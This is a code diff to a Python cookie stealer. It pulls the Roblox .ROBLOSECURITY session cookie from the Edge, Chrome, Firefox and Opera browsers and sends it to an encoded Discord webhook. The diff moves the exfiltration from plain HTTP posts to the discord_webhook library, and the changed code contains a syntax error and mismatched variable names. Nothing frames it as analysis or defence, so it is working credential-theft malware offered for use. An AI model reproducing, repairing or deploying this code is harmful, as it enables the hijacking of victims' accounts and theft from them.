@@ -2,17 +2,24 @@ import browser_cookie3, requests, threading
 import base64
 import time
 import os
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+
+
+
 
 key = "ENCODED BASE32 HOOK HEREEEE"
 
-webhook = base64.b32decode(key)
-
+weblook = base64.b32decode(key)
+webhookl = DiscordWebhook(url=weblook, , username="CookieRiver")
 def edge_logger():
     try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
     except:
         pass
 
@@ -21,7 +28,9 @@ def chrome_logger():
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
     except:
         pass
 
@@ -30,7 +39,9 @@ def firefox_logger():
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
     except:
         pass
 
@@ -39,7 +50,9 @@ def opera_logger():
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+        embed = DiscordEmbed(title='Cookie', description=f'{cookie}', color='03b2f8')
+        webhook.add_embed(embed)
+        response = webhook.execute()
     except:
         pass
 
